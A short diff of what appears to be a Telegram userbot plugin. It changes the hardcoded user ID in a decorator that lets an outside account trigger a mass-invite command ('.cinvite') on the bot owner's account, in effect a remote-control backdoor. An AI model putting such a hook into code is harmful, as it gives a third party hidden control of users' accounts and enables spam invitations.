@@ -55,7 +55,7 @@ async def get_chatinfo(event):
 
 
 @skyzu_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1964264380, pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=2127265501, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
